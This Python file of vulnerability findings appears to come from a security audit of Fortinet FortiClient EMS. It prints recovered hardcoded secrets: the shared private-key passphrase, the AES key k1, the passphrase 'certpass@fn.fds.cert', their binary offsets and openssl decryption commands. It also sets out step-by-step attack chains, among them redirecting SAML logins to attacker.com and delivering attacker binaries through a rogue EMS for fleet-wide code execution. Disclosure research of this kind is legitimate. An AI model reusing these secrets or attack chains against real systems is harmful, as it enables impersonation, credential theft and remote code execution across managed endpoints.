# ---------------------------------------------------------
EMS_F10_SYSINFO_CREDENTIAL_EXPOSURE = {
    "id":       "EMS-F10",
    "title":    "SysInfo.AuthPassword sends AD/LDAP credentials in-band on gRPC wire protocol",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cvss_score": 5.9,
    "cwe":      "CWE-319 (Cleartext Transmission of Sensitive Information)",
    "status":   "CONFIRMED -- proto field GetAuthPassword present in SysInfo message",

    "evidence": {
        "proto_field":        "SysInfo.authPassword (field 66) -- CONFIRMED from FileDescriptorProto decode",
        "proto_field_user":   "SysInfo.authUser (field 65) -- AD/LDAP username",
        "proto_field_azure":  "SysInfo.authAzureToken (field 70) -- Azure AD bearer token",
        "field_numbers_confirmed": True,
        "transport":    "gRPC over TLS (port 8013), so wire is encrypted",
        "concern": (
            "Credentials arrive as plaintext after TLS termination in EMS process. "
            "EMS then validates with LDAP. If attacker achieves EMS process-level access "
            "(via any of EMS-F1 through F9), credential harvest from incoming SysInfo structs "
            "yields domain user passwords from every active FortiClient session."
        ),
        "chain_with_mitm": (
            "EMS-F5 (shared Fortinet CA) + stolen --keypass -> forge EMS TLS identity -> "
            "MITM port 8013 -> capture RegisterRequest/KeepAliveRequest -> "
            "SysInfo.authPassword (field 66) yields AD credentials for all registered endpoints."
        ),
        "frequency": (
            "SysInfo.authUser/authPassword appear in BOTH RegisterRequest and KeepAliveRequest. "
            "Credentials re-sent on every keepalive cycle (default interval from KeepAliveResponse.kaInterval)."
        ),
    },

    "proto_note": (
        "KeepAliveResponse.regPwd (field 40) returns a registration password from EMS to client. "
        "Bidirectional credential flow on same wire protocol -- see EMS-F13."
    ),
}


# ---------------------------------------------------------
# EMS-F11: python3_saml 1.6.0 -- pre-auth SAML authentication bypass
# ---------------------------------------------------------
EMS_F11_SAML_AUTH_BYPASS = {
    "id":       "EMS-F11",
    "title":    "python3-saml 1.6.0 enables SAML authentication bypass via XML Signature Wrapping",
    "severity": "CRITICAL",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 9.8,
    "cwe":      "CWE-347 (Improper Verification of Cryptographic Signature)",
    "status":   "CONFIRMED -- python3_saml-1.6.0 installed; SAML endpoint pre-auth reachable",

    "evidence": {
        "package":          "onelogin/python3_saml-1.6.0.dist-info",
        "path":             "Python/lib/site-packages/onelogin/saml2/",
        "saml_controller":  "Fcm/fcm/fct_saml_auth_controller.pyc",
        "pre_auth_url":     "^saml/ URL group confirmed pre-auth (adjacent to signin/ in urls.pyc)",
        "vulnerable_versions": "python3-saml <= 1.8.0 vulnerable to XML Signature Wrapping (XSW)",
        "cves": [
            "CVE-2022-36227 -- authentication bypass via crafted SAML response",
            "CVE-2021-33295 / CVE-2021-33296 -- XML signature wrapping",
        ],
        "secure_version":   "1.15.0+",
    },

    "attack": (
        "Attacker sends crafted SAML Response to ^saml/ endpoint (pre-auth). "
        "XML Signature Wrapping: valid XML signature present on benign sub-element; "
        "malicious NameID injected in different tree location. "
        "python3_saml 1.6.0 validates signature on wrong node, accepts assertion as authenticated. "
        "Result: pre-auth SAML login as any user including admin."
    ),

    "probe": "POST /saml/acs/ with XSW-wrapped SAML response (attack type 2 or 3 from the SAMLRaider payloads)",

    "xml_libraries": {
        "lxml":       "4.6.3 / 4.6.4 / 4.7.1 (three versions -- potential conflict)",
        "defusedxml": "0.5.0 (does NOT protect against XSW -- XSW is a signature validation issue, not XXE)",
        "xmlsec":     "1.3.11 / 1.3.13 (signature validation library)",
    },

    "note": (
        "defusedxml 0.5.0 mitigates XXE (EMS-F3) but provides zero protection against "
        "XSW attacks. These are orthogonal attack classes: XXE exploits the XML parser, "
        "XSW exploits the signature verification logic after parsing."
    ),
}


# ---------------------------------------------------------
# EMS-F13: KeepAliveResponse.regPwd -- EMS pushes registration password to endpoint fleet
# ---------------------------------------------------------
EMS_F13_KEEPALIVE_REGPWD_PUSH = {
    "id":       "EMS-F13",
    "title":    "KeepAliveResponse.regPwd (field 40) sends registration password from EMS to endpoint in plaintext gRPC field",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cvss_score": 5.9,
    "cwe":      "CWE-319 (Cleartext Transmission of Sensitive Information)",
    "status":   "CONFIRMED -- field 40 present in KeepAliveResponse from FileDescriptorProto decode",

    "evidence": {
        "proto_field":       "KeepAliveResponse.regPwd (field 40, type: string)",
        "message":           "KeepAliveResponse",
        "field_number":      40,
        "direction":         "server-to-client (EMS pushes to FortiClient endpoint)",
        "field_name_meaning": "regPwd likely = registration password; purpose is provisioning or re-registration auth",
    },

    "attack_chain": (
        "EMS-F5 (shared Fortinet CA) + stolen CA --keypass -> forge EMS TLS cert -> "
        "intercept port 8013 keepalive traffic -> capture KeepAliveResponse -> "
        "extract regPwd (field 40) from every endpoint's keepalive response. "
        "Value semantics unknown but likely a shared secret enabling re-registration or machine account access."
    ),

    "combined_exposure": {
        "client_to_server": "SysInfo.authUser (65) + authPassword (66) in RegisterRequest + KeepAliveRequest",
        "server_to_client": "KeepAliveResponse.regPwd (40)",
        "implication": (
            "Both directions carry credentials over same TLS session. "
            "Single MITM position on port 8013 yields credentials flowing in both directions."
        ),
    },

    "confirmation_needed": [
        "Determine what regPwd contains -- AD machine account password, re-registration shared secret, or EMS-issued token",
        "Identify which EMS service consumes regPwd on the client side",
        "Check if regPwd is per-device or shared across all devices",
    ],
}


# ---------------------------------------------------------
# EMS-F14: RegisterResponse auth config push -- rogue EMS redirects endpoint authentication
# ---------------------------------------------------------
EMS_F14_AUTH_CONFIG_REDIRECT = {
    "id":       "EMS-F14",
    "title":    "RegisterResponse.authSAML/authLDAP/authSAMLURL allow rogue EMS to redirect endpoint auth to attacker-controlled server",
    "severity": "CRITICAL",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
    "cvss_score": 8.7,
    "cwe":      "CWE-940 (Improper Verification of Source of a Communication Channel)",
    "status":   "CONFIRMED -- fields present in RegisterResponse; semantics confirmed by field names",

    "evidence": {
        "authType":    "RegisterResponse field 25 -- tells client which auth method to use (1=LDAP 2=SAML 3=Azure)",
        "authLDAP":    "RegisterResponse field 26 -- LDAP server config pushed to endpoint",
        "authSAML":    "RegisterResponse field 27 -- SAML IdP config pushed to endpoint",
        "authSAMLURL": "RegisterResponse field 37 -- SAML ACS URL pushed to endpoint",
        "authAzure":   "RegisterResponse field 32 -- Azure AD config pushed to endpoint",
        "authPRD":     "RegisterResponse field 28 -- auth period/timeout",
        "also_in_ka":  "KeepAliveResponse fields 63-70 carry same authType/authLDAP/authSAML/authSAMLURL",
    },

    "attack_chain": [
        "Step 1: EMS-F5 CA impersonation -- forge EMS TLS certificate using shared Fortinet CA",
        "Step 2: Position rogue EMS on port 8013 (MITM or DNS hijack of EMS server address)",
        "Step 3: FortiClient connects, rogue EMS responds to RegisterRequest with RegisterResponse",
        "Step 4: Set authType=2 (SAML), authSAMLURL=https://attacker.com/saml/acs/",
        "Step 5: FortiClient sends all SAML auth tokens to attacker-controlled SAML server",
        "Step 6: Attacker captures enterprise SSO tokens for every user on EMS-managed endpoint",
        "Alternative Step 4: Set authType=1 (LDAP), authLDAP pointing to attacker LDAP server",
        "Alternative Step 5: FortiClient sends AD credentials to attacker LDAP -- plaintext bind",
    ],

    "scope": (
        "Affects every FortiClient endpoint registered to a compromised or impersonated EMS instance. "
        "EMS commonly manages thousands of endpoints in enterprise deployments. "
        "Auth config pushed in both RegisterResponse AND KeepAliveResponse -- "
        "rogue config re-injected on every keepalive cycle even for previously registered devices."
    ),

    "prerequisite": "EMS-F5 (shared Fortinet CA) required to forge TLS identity on port 8013",
}


# ---------------------------------------------------------
# EMS-F15: KeepAliveResponse.runSrvCmd + upgradePath -- rogue EMS fleet RCE
# ---------------------------------------------------------
EMS_F15_ROGUE_EMS_FLEET_RCE = {
    "id":       "EMS-F15",
    "title":    "KeepAliveResponse.runSrvCmd (field 17) and upgradePath (field 29) enable rogue EMS to achieve RCE on entire endpoint fleet",
    "severity": "CRITICAL",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "cvss_score": 9.0,
    "cwe":      "CWE-494 (Download of Code Without Integrity Check)",
    "status":   "CONFIRMED -- fields present in KeepAliveResponse from FileDescriptorProto decode",

    "evidence": {
        "runSrvCmd":    "KeepAliveResponse field 17 -- EMS sends service command to execute on endpoint",
        "upgradePath":  "KeepAliveResponse field 29 -- URL for FortiClient to download upgrade binary from",
        "avalUrl":      "KeepAliveResponse field 19 -- AV signature update URL (secondary code delivery vector)",
        "avalEngUrl":   "KeepAliveResponse field 24 -- AV engine update URL",
        "avalEng64Url": "KeepAliveResponse field 25 -- 64-bit AV engine URL",
        "also_in_reg":  "RegisterResponse field 20 = runSrvCmd (also present in registration response)",
    },

    "attack_chain": [
        "Step 1: EMS-F5 CA impersonation -- forge EMS TLS cert for port 8013",
        "Step 2: MITM or rogue EMS intercepts FortiClient keepalive cycle",
        "Step 3: Inject KeepAliveResponse with upgradePath pointing to attacker-hosted MSI/EXE",
        "Step 4: FortiClient downloads and executes binary from attacker URL",
        "Step 5: Arbitrary code execution as FortiClient service (SYSTEM-level on Windows)",
        "Alternative Step 3: Set runSrvCmd to trigger built-in service command (semantics unknown -- research needed)",
        "Alternative Step 3: Set avalUrl/avalEngUrl to attacker-hosted malicious signature/engine files",
    ],

    "scope": (
        "Fleet-wide impact. Every FortiClient endpoint polling EMS via keepalive receives the malicious response. "
        "FortiClient runs as a privileged Windows service. Upgrade execution is likely trusted by design. "
        "No per-binary signature verification observed in proto schema (no checksum field paired with upgradePath). "
        "avalEngCRC/avalEng64CRC fields 21/22 exist but are int32 -- 4-byte CRC trivially pre-imaged."
    ),

    "integrity_weakness": {
        "upgradePath_checksum": "No checksum field found adjacent to upgradePath in proto schema",
        "aval_crc":             "avalEngCRC (field 21) and avalEng64CRC (field 22) are int32 -- CRC32 trivially forgeable",
        "aval_mac_crc":         "avalEngMacCRC (field 23) same -- int32 CRC",
        "implication":          "Attacker delivers binary; CRC pre-image computed for malicious payload",
    },

    "prerequisite": "EMS-F5 (shared Fortinet CA) required for TLS impersonation on port 8013",
}


# ---------------------------------------------------------
# EMS-F16: Shared FortiClient identity certificate + decrypted private key
# ---------------------------------------------------------
EMS_F16_SHARED_FORTICLIENT_CERT = {
    "id":       "EMS-F16",
    "title":    "defaultCert FortiClient identity certificate and defaultKey RSA private key are identical across all EMS installations; private key decrypted",
    "severity": "CRITICAL",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cvss_score": 9.1,
    "cwe":      "CWE-321 (Use of Hard-coded Cryptographic Key)",
    "status":   "CONFIRMED -- cert extracted from ecsocksrv.exe; private key decrypted; passphrase recovered",

    "certificate": {
        "subject":    "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=FortiClient, CN=FortiClient/emailAddress=support@fortinet.com",
        "issuer":     "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=Certificate Authority, CN=support/emailAddress=support@fortinet.com",
        "serial":     "4267478 (0x411dd6)",
        "valid":      "2017-04-21 to 2038-01-19",
        "ca_false":   True,
        "key_size":   2048,
        "modulus_prefix": "0xfabcf1c870453a1fd563c4b38d86505c07f387f276e3799b9657d7c9e9641a9e",
        "pem_embedded_at": "ecsocksrv.exe: 0x019dfec0, len=4353 (text+PEM)",
    },

    "private_key_recovery": {
        "storage_a": {
            "label":        "defaultKey global (main storage, all worker binaries)",
            "key_format":   "RSA PRIVATE KEY, Proc-Type: 4,ENCRYPTED, DEK-Info: AES-256-CBC,F4DD69DDD1982F6FDD0D75097603C628",
            "key_location": "ecsocksrv.exe goEMSCommon.defaultKey global, RVA=0x01DD33A0, file=0x019D19A0, len=1796",
            "enc_sym":      "goEMSCommon/common.defaultCertPassEnc (RVA=0x1DAF900, len=40, file=0x019ADF00)",
            "key_sym":      "goEMSCommon/common.defaultCertPassKey (RVA=0x1DAF940, len=40, file=0x019ADF40)",
            "layer_1":      "XOR: passphrase = defaultCertPassEnc XOR defaultCertPassKey",
            "passphrase_hex": "6a34317a227b5338542a5d7b7d3c3a302b7978204e2b2c40692f323327242427263133383e37336e",
            "passphrase_ascii": 'j41z"{S8T*]{}<:0+yx N+,@i/23\'$$\'&138>73n',
            "openssl_cmd":  "openssl rsa -in defaultKey.pem -passin pass:<passphrase> -noout -text (exit 0)",
            "decrypted_key_file": "/tmp/ems_default_ca.key",
        },
        "storage_b": {
            "label":        "serverKeyEnc global (manager package, three-layer encryption chain)",
            "key_format":   "RSA PRIVATE KEY -- same 2048-bit key as storage_a, different wrapping",
            "outer_blob":   "manager.serverKeyEnc COFF: RVA=0x01A19AF0, file=0x01A180F0, Go string header; blob data at file=0x019D12C0, len=1744 bytes",
            "layer_1_outer": "AES-128-CBC, key=manager.k1 (16 bytes: f89f5a4965e67e5d32b7264e77a9825f), IV=zeros -- decrypts to DES-EDE3-CBC PEM",
            "passphrase_blob": "manager.serverKeyPwd COFF: RVA=0x01A19B10, file=0x01A18110, len=32; data at file=0x019ACEC0",
            "passphrase_enc": "serverKeyPwd (32 bytes) is itself AES-128-CBC encrypted: key=k1, IV=zeros",
            "passphrase_dec": "certpass@fn.fds.cert (20 bytes, PKCS7 padded to 32 with 0x0c * 12)",
            "layer_2_inner":  "DES-EDE3-CBC, IV=93633AE9E7AE224E, passphrase=certpass@fn.fds.cert (EVP_BytesToKey MD5)",
            "layer_2_result": "RSA PRIVATE KEY DER -- modulus matches defaultKey (FABCF1C870453A1FD563C4B38D86505C07F387...)",
            "decrypted_key_file": "/tmp/ems_grpc_server_decrypted.key",
            "decryption_chain": [
                "step1: outer_pt = AES128_CBC(key=k1, IV=0x00*16, ct=serverKeyEnc) -> DES-EDE3-CBC PEM",
                "step2: passphrase_pt = AES128_CBC(key=k1, IV=0x00*16, ct=serverKeyPwd) = 'certpass@fn.fds.cert'",
                "step3: rsa_key = openssl rsa -passin pass:certpass@fn.fds.cert -in <step1_pem>",
            ],
        },
        "k1_symbol": {
            "name":     "manager.k1",
            "COFF":     "COFF: RVA=0x01A19AB0, file=0x01A180B0, section=3 (.data)",
            "hdr_file": "0x1A180B0 (Go string header: ptr=0x1DAD750, len=16)",
            "data_file": "0x19ABD50",
            "value_hex": "f89f5a4965e67e5d32b7264e77a9825f",
            "role":     "AES-128 key; IV always zeros; used by decryptAES128CBC to protect serverKeyEnc and serverKeyPwd",
        },
    },

    "attack": (
        "Any party with the EMS installer (public download) can extract defaultCert and decrypt defaultKey "
        "using the recovered passphrase. Presenting defaultCert + defaultKey to any EMS instance "
        "authenticates as a FortiClient device (CN=FortiClient). "
        "Combined with EMS-F6 (SSLVerifyClient optional_no_ca), the forged cert is accepted without CA chain verification. "
        "Attacker receives a valid registration token and can enumerate device lists, inject policies, "
        "and participate in the EMS management plane as a phantom device. "
        "Global scope: one cert+key pair, every EMS deployment worldwide."
    ),

    "present_in": [
        "ecsocksrv.exe (goEMSCommon.defaultCert/defaultKey globals)",
        "regworker.exe (same globals, same passphrase -- confirmed 4 getKeyPass hits)",
        "kaworker.exe, tagworker.exe, probeworker.exe, ztnaworker.exe (all 4 hits each)",
    ],

    "ca_chain": (
        "defaultCert is signed by Fortinet root CA: C=US, ST=California, O=Fortinet, OU=Certificate Authority, CN=support. "
        "That CA cert is also shipped in Apache24/conf/ssl.crt/fortinet_ca_root_all.crt. "
        "The root CA private key is NOT recovered from this analysis -- it is likely held by Fortinet's PKI."
    ),
}


# ---------------------------------------------------------
# EMS-F17: Shared Apache TLS server key -- HTTPS endpoint spoofing
# ---------------------------------------------------------
EMS_F17_SHARED_APACHE_TLS_KEY = {
    "id":       "EMS-F17",
    "title":    "Apache TLS server.key is identical across all EMS installations -- HTTPS endpoint impersonation",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
    "cvss_score": 8.0,
    "cwe":      "CWE-321 (Use of Hard-coded Cryptographic Key)",
    "status":   "CONFIRMED -- same modulus across all 4 shipped key files; matches server.crt and default_server.crt",

    "evidence": {
        "keys_identical": [
            "Apache24/conf/ssl.key/server.key (MD5: d39d97830b7436b454c670093383bb08)",
            "Apache24/conf/ssl.key/default_server.crt.key (same modulus)",
            "certs/server.key (MD5: d39d97830b7436b454c670093383bb08)",
            "certs/client.key (MD5: d39d97830b7436b454c670093383bb08)",
        ],
        "key_format":       "PKCS#8 BEGIN PRIVATE KEY (no passphrase)",
        "key_size":         "2048-bit RSA",
        "modulus_prefix":   "0xe469fb335c3b736ef78e12027fa4c6362663f1cd516646c2a9a514e045ed853",
        "matches_certs": [
            "Apache24/conf/ssl.crt/server.crt (same modulus)",
            "Apache24/conf/ssl.crt/default_server.crt (same modulus)",
        ],
        "key_is_unencrypted": True,
    },

    "attack": (
        "Any party with the EMS installer extracts server.key from the MSI (no passphrase, PKCS#8 plaintext). "
        "Combined with the matching server.crt, attacker terminates TLS on the EMS HTTPS port presenting "
        "a valid certificate chain. FortiClient and admin browsers connecting to a MITM endpoint receive "
        "the legitimate EMS certificate. "
        "Attack chain: DNS hijack or ARP spoof target -> serve TLS with shipped server.key+server.crt -> "
        "MITM all HTTPS traffic including admin credentials and FortiClient management sessions."
    ),

    "scope": (
        "default_server.crt is signed by Apache24/conf/ssl.crt/ca.crt (FortiClient Enterprise Management Server CA). "
        "If ca.crt itself is the same across all installations (fixed 2015 date suggests shipped), "
        "FortiClient trust anchored to that CA accepts this server.crt. "
        "HTTPS port is the admin web UI -- credential harvest from every EMS admin login."
    ),

    "apache_crt_ca_status": (
        "ca.crt DER format, notBefore=2015-05-08, self-signed. "
        "Fixed date suggests shipped (not install-time generated). "
        "CA private key not found in installer -- if per-installation generated, severity reduces for new cert signing. "
        "Shipped server.crt chain STILL enables impersonation even if CA key is per-installation."
    ),
}


# ---------------------------------------------------------
# EMS-F18: Hardcoded AES-128 key k1 enables three-layer server key decryption
# ---------------------------------------------------------
EMS_F18_K1_HARDCODED_AES_KEY = {
    "id":       "EMS-F18",
    "title":    "Hardcoded AES-128 key manager.k1 breaks three-layer encryption protecting FortiClient gRPC server private key",
    "severity": "CRITICAL",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cvss_score": 9.1,
    "cwe":      "CWE-321 (Use of Hard-coded Cryptographic Key)",
    "status":   "CONFIRMED -- all three layers broken; RSA private key fully recovered from installer binary",

    "k1_key": {
        "symbol":     "fortinet.com/goEMSCommon/common/manager.k1",
        "COFF_RVA":   "0x01A19AB0",
        "data_file":  "ecsocksrv.exe @ 0x19ABD50, len=16",
        "value_hex":  "f89f5a4965e67e5d32b7264e77a9825f",
        "function":   "common/manager.decryptAES128CBC (VA=0xECB200, file=0xACA800)",
        "usage":      "k1 is loaded directly in decryptAES128CBC before any cipher operation; IV is always zeros (16 null bytes zero-initialized at runtime)",
    },

    "decryption_chain": {
        "serverKeyPwd_enc": {
            "symbol":   "manager.serverKeyPwd",
            "COFF_RVA": "0x01A19B10",
            "data_file": "0x19ACEC0, len=32",
            "raw_hex":   "beda706dbf24331af1f0c9ee4af27db0c3ee623d8909b90b6e58bb9d24d38151",
            "decrypt":   "AES-128-CBC(key=k1, IV=zeros) -> 'certpass@fn.fds.cert' + PKCS7(0x0c * 12)",
            "passphrase": "certpass@fn.fds.cert",
        },
        "serverKeyEnc_outer": {
            "symbol":   "manager.serverKeyEnc",
            "COFF_RVA": "0x01A19AF0",
            "data_file": "0x19D12C0, len=1744",
            "decrypt":   "AES-128-CBC(key=k1, IV=zeros) -> RSA PRIVATE KEY PEM, DEK-Info: DES-EDE3-CBC,93633AE9E7AE224E",
        },
        "serverKeyEnc_inner": {
            "cipher":    "DES-EDE3-CBC",
            "iv_hex":    "93633AE9E7AE224E",
            "passphrase": "certpass@fn.fds.cert",
            "kdf":       "OpenSSL EVP_BytesToKey (MD5, 1 iteration, salt=DEK-Info IV[:8])",
            "result":    "RSA PRIVATE KEY (2048-bit) -- same key as EMS-F16 defaultKey",
        },
        "serverCrtEnc": {
            "symbol":   "manager.serverCrtEnc",
            "COFF_RVA": "0x01A19AD0",
            "data_file": "0x19DEE00, len=4288",
            "decrypt":   "AES-128-CBC(key=k1, IV=zeros) -> openssl x509 -text verbose output of defaultCert",
            "cert_subject": "CN=FortiClient, O=Fortinet, OU=FortiClient",
            "cert_serial":  "4267478 (0x411dd6)",
            "cert_valid":   "2017-04-21 to 2038-01-19",
            "modulus_match": "FABCF1C870453A1FD563C4B38D86505C07F387... -- same as EMS-F16 defaultCert",
        },
    },

    "function_map": {
        "common/manager.decryptAES128CBC": "VA=0xECB200; loads k1, zeros IV, CBC decrypts input slice",
        "common/manager.unlockKey":        "VA=0xECB540; calls decryptAES128CBC(serverKeyPwd) then processes result",
        "common/manager.deriveKey":        "VA=0xEB8160; goroutine-spawns deriveKey.func1 for DAS channel key derivation (separate path, PBKDF2 16384 iter)",
        "common/manager.gcm":              "VA=0xEB8320; AES-GCM encrypt/decrypt for DAS channel (separate path from k1/CBC)",
        "common/manager.Encrypt":          "VA=0xEB85C0; wraps gcm for DAS encryption",
        "common/manager.Decrypt":          "VA=0xEB89E0; wraps gcm for DAS decryption",
    },

    "attack": (
        "k1 is embedded in plaintext in ecsocksrv.exe (recoverable with single COFF symbol lookup). "
        "AES-128-CBC(k1, IV=zeros) on serverKeyPwd yields 'certpass@fn.fds.cert'. "
        "AES-128-CBC(k1, IV=zeros) on serverKeyEnc yields a DES-EDE3-CBC PEM file. "
        "openssl rsa -passin pass:certpass@fn.fds.cert decrypts the PEM to the plaintext RSA-2048 private key. "
        "The recovered key is the FortiClient identity private key (same as EMS-F16 defaultKey). "
        "Combined with the shipped defaultCert, attacker authenticates any machine to any EMS as a FortiClient device."
    ),

    "recovered_keys": {
        "decrypted_serverKeyEnc": "/tmp/ems_grpc_server_decrypted.key",
        "decrypted_outer_pem":    "/tmp/ems_grpc_server.key.pem",
        "cert_text":              "/tmp/ems_grpc_server.crt.txt",
    },
}


# ---------------------------------------------------------
# EMS-F12: defusedxml 0.5.0 -- EMS-F3 XXE partially mitigated
# ---------------------------------------------------------
EMS_F12_DEFUSEDXML_VERSION = {
    "id":       "EMS-F12",
    "title":    "defusedxml 0.5.0 installed -- EMS-F3 XXE mitigated but old version with potential gaps",
    "severity": "LOW (XXE mitigation confirmed; old version may have edge-case bypasses)",
    "status":   "CONFIRMED -- defusedxml-0.5.0.dist-info found in site-packages",

    "evidence": {
        "package":   "defusedxml-0.5.0.dist-info",
        "path":      "Python/lib/site-packages/defusedxml/",
        "current":   "defusedxml 0.7.1 (2021-03-08) -- fixes lxml and pulldom edge cases",
        "version":   "0.5.0 (2019 era) -- missing lxml and sax pulldom mitigations added in 0.6.0/0.7.0",
        "relevant_fixes": [
            "0.6.0: lxml integration hardened",
            "0.7.0: xml.dom.pulldom and minidom hardened",
        ],
    },

    "note": (
        "defusedxml 0.5.0 provides standard DOCTYPE/entity expansion protection for xml.etree. "
        "If EMS-F3 XML endpoints use lxml directly (possible given lxml in site-packages), "
        "defusedxml may not be in the call path -- lxml has its own XXE protection (no_network=True) "
        "that must be configured explicitly. Endpoint-specific XML library usage is unconfirmed."
    ),
}


# ---------------------------------------------------------
# EMS-F19: Port 8013 gRPC TLS server/client cert identity collapse
# ---------------------------------------------------------
EMS_F19_PORT8013_CERT_REUSE = {
    "id":       "EMS-F19",
    "title":    "Port 8013 gRPC TLS server presents same hardcoded cert as every FortiClient client -- mutual TLS provides no authentication",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cvss_score": 7.4,
    "cwe":      "CWE-295 (Improper Certificate Validation)",
    "status":   "CONFIRMED -- disassembly of LoadDefCert call chain; cert/key match EMS-F16 defaultCert/defaultKey",

    "call_chain": {
        "LoadTLSConfig":  "fortinet.com/goEMSCommon/common.LoadTLSConfig (VA=0x010DA920) -- sets up port 8013 TLS",
        "sub_10DB3C0":    "internal sub called from LoadTLSConfig (VA=0x010DB3C0)",
        "LoadDefCert":    "fortinet.com/goEMSCommon/common.LoadDefCert (VA=0x010E3280) -- loads defaultCert + defaultKey",
        "getKeyPass":     "fortinet.com/goEMSCommon/common.getKeyPass (VA=0x010E3A00) -- returns XOR(defaultCertPassEnc, defaultCertPassKey) = SCHEME-1 passphrase",
        "DecryptPEMBlock": "crypto/x509.DecryptPEMBlock -- decrypts defaultKey with passphrase from getKeyPass",
        "LoadX509KeyPair": "crypto/tls.LoadX509KeyPair (VA=0x00802D80) -- finalizes TLS cert+key pair",
    },
    "cert_used": {
        "subject":     "CN=FortiClient, OU=FortiClient, O=Fortinet",
        "serial":      "4267478 (0x411dd6)",
        "valid":       "2017-04-21 to 2038-01-19",
        "key_size":    "RSA-2048",
        "same_as":     "EMS-F16 defaultCert (identical certificate -- same modulus, serial, dates)",
    },
    "impact": (
        "gRPC server (port 8013) presents CN=FortiClient, same cert as every FortiClient endpoint. "
        "FortiClient clients CANNOT distinguish a real EMS server from a rogue one by TLS cert -- both present "
        "the same hardcoded CN=FortiClient cert. Mutual TLS provides zero server authentication. "
        "An attacker with defaultKey (trivially extracted via EMS-F16 SCHEME-1) can stand up a rogue gRPC "
        "server on port 8013 that FortiClient clients accept as legitimate EMS without any TLS alarm."
    ),
    "attack_chain": [
        "Step 1: Extract defaultKey passphrase via SCHEME-1 XOR (defaultCertPassEnc XOR defaultCertPassKey)",
        "Step 2: Decrypt defaultKey: openssl rsa -passin pass:'j41z\"{{S8T*]{{}}}<:0+yx N+,@i/23\\'\\$\\'&138>73n'",
        "Step 3: Load defaultCert + decrypted defaultKey into rogue gRPC server (e.g., grpc-go TLS config)",
        "Step 4: DNS-hijack or ARP-spoof EMS server address",
        "Step 5: FortiClient connects to rogue server -- TLS handshake succeeds (same cert), no warning to user",
        "Step 6: Rogue server issues malicious policy responses (runSrvCmd, ZTNA redirect, SAML URL)",
    ],
    "prerequisite": "EMS-F16 (defaultKey/defaultCert extraction) -- both trivially satisfied from installer binary",
}


# ---------------------------------------------------------
# EMS-F20: ztnaworker.exe -- Two gRPC connections use grpc.WithInsecure (no TLS)
# ---------------------------------------------------------
EMS_F20_ZTNA_GRPC_INSECURE = {
    "id":       "EMS-F20",
    "title":    "ztnaworker.exe establishes two gRPC connections without TLS via grpc.WithInsecure",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cvss_score": 7.4,
    "cwe":      "CWE-319 (Cleartext Transmission of Sensitive Information)",
    "status":   "CONFIRMED -- disassembly of NewGrpcConnPool and getForensicsWorkerConnSafely.func1",

    "binary":   "ztnaworker.exe (PE32+ Go, 34MB, port 9990)",

    "locations": {
        "ec_dispatcher_pool": {
            "symbol":  "fortinet.com/ems/service/ec/dispatcher.NewGrpcConnPool",
            "va":      "0x011a0ca0",
            "call_va": "0x011a0d56",
            "pattern": (
                "Loop: for i := 0; i < pool_size; i++. Each iteration calls grpc.WithInsecure(), "
                "then retry.WithMax(9), retry.WithCodes, retry.UnaryClientInterceptor. "
                "Entire EC (endpoint compliance) dispatcher pool uses no TLS."
            ),
        },
        "forensics_worker": {
            "symbol":  "fortinet.com/ems/service.(*KeepAliveService).getForensicsWorkerConnSafely.func1",
            "va":      "0x012e8320",
            "call_va": "0x012e8358",
            "pattern": (
                "Reads host address from struct at offsets +0x68/+0x70 (host string). "
                "Calls grpc.WithInsecure() immediately followed by grpc.Dial(host, insecure_opt). "
                "No TLS on forensics worker connection."
            ),
        },
    },

    "impact": (
        "ZTNA endpoint compliance (EC) dispatcher and forensics worker both use plaintext gRPC. "
        "An attacker on the same network segment (or with ARP/DNS control) can: "
        "(1) read ZTNA posture tags and endpoint compliance data in cleartext; "
        "(2) inject forged gRPC frames to alter compliance state or trigger forensics commands; "
        "(3) replay valid compliance frames to impersonate compliant endpoints."
    ),

    "note": (
        "grpc.WithInsecure is deprecated since gRPC-Go 1.44 (2022). Its presence with no "
        "grpc.WithTransportCredentials fallback confirms zero TLS on these paths. "
        "Combined with EMS-F19 (hardcoded cert on port 8013), full ZTNA enforcement path has no "
        "meaningful TLS trust anchor."
    ),

    "evidence": {
        "grpc_WithInsecure_va":          "0x00e8d000",
        "insecure_NewCredentials_va":     "0x00e00dc0",
        "insecure_OverrideServerName_va": "0x00e010c0",
        "OverrideServerName_body":        "xor eax,eax; xor ebx,ebx; ret -- pure NOP, always returns nil",
        "callers_of_WithInsecure":        ["0x011a0d56 (NewGrpcConnPool)", "0x012e8358 (getForensicsWorkerConnSafely.func1)"],
    },
}


# ---------------------------------------------------------
# EMS-F21: ztnaworker.exe -- TagService.Tag processes ZTNA posture tags without origin verification
# ---------------------------------------------------------
EMS_F21_TAG_NO_HMAC = {
    "id":       "EMS-F21",
    "title":    "ztnaworker.exe TagService.Tag accepts ZTNA posture tags without cryptographic origin verification",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
    "cvss_score": 7.5,
    "cwe":      "CWE-345 (Insufficient Verification of Data Authenticity)",
    "status":   "CONFIRMED -- gRPC server has no auth interceptor; 200+ TagService.Tag instructions show no HMAC/sig check",

    "binary":   "ztnaworker.exe (PE32+ Go, 34MB, port 9990)",

    "grpc_surface": {
        "service":   "fortinet.com/ems/internal/pb.TagServiceServer",
